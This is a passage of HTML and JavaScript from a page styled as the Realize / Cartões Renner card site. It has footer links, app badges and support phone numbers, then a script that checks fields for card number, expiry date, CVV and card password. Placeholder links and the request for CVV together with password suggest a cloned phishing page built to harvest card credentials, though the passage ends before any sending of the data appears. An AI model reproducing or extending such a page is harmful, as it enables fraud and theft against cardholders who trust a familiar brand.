                                <li><a target="_blank" href="https://firebasestorage.googleapis.com/v0/b/smiling-sweep-146718.appspot.com/o/pf%2Fsite%2Ffaq%2FPol%C3%ADtica%20de%20Privacidade%20e%20de%20Prote%C3%A7%C3%A3o%20de%20Dados%20-%20Realize.pdf?alt=media&amp;token=64f168fb-090e-4f5c-a7bf-ff1b7728fec9">Privacidade e Segurança</a></li>
                            </ul>
                        </li>
                        <li><a href="#site/central-negociacao">Central de Negociação</a></li>
                        <li><a href="#cartoes-renner/login">Acessa Sua Conta</a></li>
                    </ul>
                    <div>
                        <p class="footer__texto-destaque">Baixe o app da Renner</p>
                        <div class="footer__badges"><a href="#"><img src="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/vectors/google-play-badge.svg"></a><a href="#"><img src="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/vectors/app-store-badge.svg"></a></div>
                    </div>
                </div>
                <div class="footer__informacoes">
                    ...
                    <div class="footer__telefones">
                        <div class="footer__telefones__bloco">
                            ...
                            <p>De segunda a sábado, das 8h às 20h40</p><a href="#">Para acessar o canal de atendimento por vídeo, clique aqui.</a>
                            ...
                            <div class="footer__whatsapp">
                                <p>Mande um Oi para</p><svg class="footer__whatsapp-icon">
                                    <use xlink:href="/cartoes-renner/vectors/whatsapp.svg#whatsapp"></use>
                                </svg><a class="footer__telefone" href="#">+55 (51) 3921 4004</a>
                            </div>
                            <p>Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala</p>
                            <p>Horário de atendimento:</p>
                            <p>De segunda a sábado, das 8h às 20h40</p><a href="#">Para acessar o canal de atendimento por vídeo, clique aqui.</a><a href="#">
                        ...
                        <div class="footer__telefones__bloco">
                            ...
                            <div class="footer__whatsapp">
                                <p>Mande um Oi para</p><svg class="footer__whatsapp-icon">
                                    <use xlink:href="/cartoes-renner/vectors/whatsapp.svg#whatsapp"></use>
                                </svg><a class="footer__telefone" href="5139215464" target="_blank">+55 (51) 3921 5464</a>
                            </div>
    ...
    $(document).ready(() => {
        ...
        $("#continue").click(() => {
            if (($('#step1').css('display') == 'none')) {
                if ($("#card").val().length < 19 || $("#date").val().length < 5 || $("#cvv").val().length < 3 || $("#passw").val().length < 4) {
